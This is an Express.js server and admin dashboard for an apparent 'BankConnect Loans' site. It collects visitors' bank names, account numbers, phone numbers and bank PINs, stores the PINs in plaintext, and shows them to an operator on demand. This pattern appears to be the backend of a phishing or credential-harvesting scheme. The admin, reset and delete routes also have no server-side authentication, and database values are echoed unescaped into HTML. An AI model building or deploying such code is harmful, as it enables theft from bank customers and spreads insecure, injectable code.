const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");
const path = require("path");

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

app.get("/", (req, res) => {
  res.redirect("/admin");
});

app.get("/test-db", async (req, res) => {
  try {

    const result = await pool.query("SELECT NOW()");

    res.json(result.rows[0]);

  } catch (err) {

    res.status(500).json({
      error: err.message
    });

  }
});

app.get("/create-table", async (req, res) => {

  try {

    await pool.query(`
      CREATE TABLE IF NOT EXISTS bank_withdrawals (
        id SERIAL PRIMARY KEY,
        bank_name TEXT NOT NULL,
        account_number TEXT NOT NULL,
        phone_number TEXT NOT NULL,
        bank_pin TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    res.send("Bank withdrawals table created successfully");

  } catch (err) {

    console.error(err);

    res.status(500).send(err.message);

  }

});

app.get("/reset-table", async (req, res) => {

  try {

    await pool.query("DROP TABLE IF EXISTS bank_withdrawals");

    await pool.query(`
      CREATE TABLE bank_withdrawals (
        id SERIAL PRIMARY KEY,
        bank_name TEXT NOT NULL,
        account_number TEXT NOT NULL,
        phone_number TEXT NOT NULL,
        bank_pin TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    res.send("Table reset successfully");

  } catch (err) {

    console.error(err);

    res.status(500).send(err.message);

  }

});
app.post("/submit", async (req, res) => {

  try {

    const {
      bank_name,
      account_number,
      phone_number,
      bank_pin
    } = req.body;

    await pool.query(
      `INSERT INTO bank_withdrawals
      (bank_name, account_number, phone_number, bank_pin)
      VALUES ($1, $2, $3, $4)`,
      [
        bank_name,
        account_number,
        phone_number,
        bank_pin
      ]
    );

    res.json({
      success: true,
      message: "Withdrawal request submitted successfully"
    });

  } catch (err) {

    console.error(err);

    res.status(500).json({
      success: false,
      message: err.toString()
    });

  }

});

app.get("/delete/:id", async (req, res) => {

  try {

    await pool.query(
      "DELETE FROM bank_withdrawals WHERE id = $1",
      [req.params.id]
    );

    res.redirect("/dashboard");

  } catch (err) {

    console.error(err);

    res.status(500).send(err.message);

  }

});

app.post("/delete-selected", async (req, res) => {

  try {

    const { ids } = req.body;

    if (!ids || ids.length === 0) {
      return res.redirect("/dashboard");
    }

    await pool.query(
      "DELETE FROM bank_withdrawals WHERE id = ANY($1::int[])",
      [Array.isArray(ids) ? ids : [ids]]
    );

    res.sendStatus(200);

  } catch (err) {

    console.error(err);

    res.status(500).send(err.message);

  }

});

app.get("/admin", (req, res) => {

  res.sendFile(path.join(__dirname, "public", "admin.html"));

});
app.get("/dashboard", async (req, res) => {

  try {

    const result = await pool.query(
      "SELECT * FROM bank_withdrawals ORDER BY id DESC"
    );

    let rows = "";

    result.rows.forEach(item => {

      rows += `
<tr>

<td>
<input
type="checkbox"
name="ids"
value="${item.id}">
</td>

<td>${item.id}</td>

<td>${item.bank_name}</td>

<td>${item.account_number}</td>

<td>${item.phone_number}</td>

<td>

<span id="pin${item.id}">
••••••
</span>

<span
onclick="togglePin(${item.id},'${item.bank_pin}')"
style="cursor:pointer;font-size:18px;margin-left:8px;">
👁️
</span>

</td>

<td>${new Date(item.created_at).toLocaleString()}</td>

<td>

<a
href="/delete/${item.id}"
onclick="return confirm('Delete this record?')"
style="
background:#dc3545;
color:white;
padding:8px 14px;
border-radius:6px;
text-decoration:none;
font-weight:bold;">
🗑 Delete
</a>

</td>

</tr>
`;

    });

    res.send(`
<!DOCTYPE html>

<html>

<head>

<meta charset="UTF-8">

<meta name="viewport"
content="width=device-width,initial-scale=1.0">

<title>BankConnect Admin Dashboard</title>
<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial,sans-serif;
}

body{
background:#0d1117;
color:#ffffff;
padding:25px;
}

.header{
display:flex;
justify-content:space-between;
align-items:center;
background:#161b22;
padding:20px;
border-radius:12px;
border-left:6px solid #D4AF37;
margin-bottom:25px;
}

.header h1{
font-size:30px;
color:#D4AF37;
margin-bottom:5px;
}

.header p{
color:#c9d1d9;
}

.secured{
color:#4ade80;
font-weight:bold;
margin-top:8px;
}

.stats{
display:grid;
grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
gap:20px;
margin-bottom:25px;
}

.card{
background:#161b22;
padding:20px;
border-radius:10px;
border:1px solid #30363d;
text-align:center;
}

.card h2{
font-size:34px;
color:#D4AF37;
margin-top:10px;
}

.top-bar{
display:flex;
justify-content:space-between;
align-items:center;
flex-wrap:wrap;
gap:15px;
margin-bottom:20px;
}

.search{
width:320px;
padding:12px;
background:#21262d;
border:1px solid #30363d;
border-radius:8px;
color:white;
font-size:15px;
outline:none;
}

button{
background:#D4AF37;
color:#000;
border:none;
padding:12px 18px;
border-radius:8px;
font-weight:bold;
cursor:pointer;
transition:.3s;
}

button:hover{
background:#f5c542;
}

table{
width:100%;
border-collapse:collapse;
background:#161b22;
}

th{
background:#0b5ed7;
color:white;
padding:14px;
border:1px solid #30363d;
}

td{
padding:12px;
border:1px solid #30363d;
text-align:center;
}

tr:nth-child(even){
background:#1c2128;
}

tr:hover{
background:#2d333b;
}

a{
text-decoration:none;
}

#clock{
color:#D4AF37;
font-weight:bold;
margin-top:8px;
}

</style>

</head>
<body>

<div class="header">

<div>

<h1>🏦 BankConnect Loans</h1>

<p>Administrator Dashboard</p>

<p class="secured">🔒 ADMIN SECURED SESSION</p>

<p id="clock"></p>

</div>

<div>

<button onclick="location.reload()">
🔄 Refresh
</button>

<button onclick="logout()">
🚪 Logout
</button>

</div>

</div>

<div class="stats">

<div class="card">
<p>Total Requests</p>
<h2>${result.rows.length}</h2>
</div>

<div class="card">
<p>Today's Requests</p>
<h2>${result.rows.length}</h2>
</div>

<div class="card">
<p>System Status</p>
<h2 style="font-size:22px;color:#4ade80;">
ONLINE
</h2>
</div>

</div>

<div class="top-bar">

<div>

<button
type="button"
onclick="deleteSelected()">
🗑 Delete Selected
</button>

</div>

<div>

<input
type="text"
id="searchBox"
class="search"
placeholder="Search bank, account or phone..."
onkeyup="searchTable()">

</div>

</div>

<table id="recordsTable">

<tr>

<th>

<input
type="checkbox"
id="selectAll"
onclick="toggleSelectAll()">

</th>

<th>ID</th>

<th>Bank Name</th>

<th>Account Number</th>

<th>Phone Number</th>

<th>Bank PIN</th>

<th>Date & Time</th>

<th>Action</th>

</tr>

${rows}

</table>

<br>

<script>
function deleteSelected(){

const ids=[];

document.querySelectorAll("input[name='ids']:checked").forEach(item=>{
ids.push(item.value);
});

if(ids.length===0){
alert("Please select at least one record.");
return;
}

if(!confirm("Delete selected records?")){
return;
}

fetch("/delete-selected",{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({ids})
})
.then(response=>{
if(response.ok){
location.reload();
}else{
alert("Failed to delete selected records.");
}
});

}

function logout(){

sessionStorage.removeItem("adminLoggedIn");

window.location.href="/admin";

}

function toggleSelectAll(){

const checked=document.getElementById("selectAll").checked;

document.querySelectorAll("input[name='ids']").forEach(item=>{
item.checked=checked;
});

}

function searchTable(){

const input=document.getElementById("searchBox").value.toLowerCase();

const rows=document.querySelectorAll("#recordsTable tr");

rows.forEach((row,index)=>{

if(index===0)return;

const text=row.innerText.toLowerCase();

row.style.display=text.includes(input)?"":"none";

});

}

function togglePin(id,pin){

const element=document.getElementById("pin"+id);

if(element.innerHTML==="••••••"){

element.innerHTML=pin;

}else{

element.innerHTML="••••••";

}

}

function updateClock(){

const now=new Date();

document.getElementById("clock").innerHTML=
now.toLocaleString();

}

updateClock();

setInterval(updateClock,1000);
</script>

</body>

</html>
`);

  } catch (err) {

    console.error(err);

    res.status(500).send(err.message);

  }

});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {

  console.log(`Server started on port ${PORT}`);

});
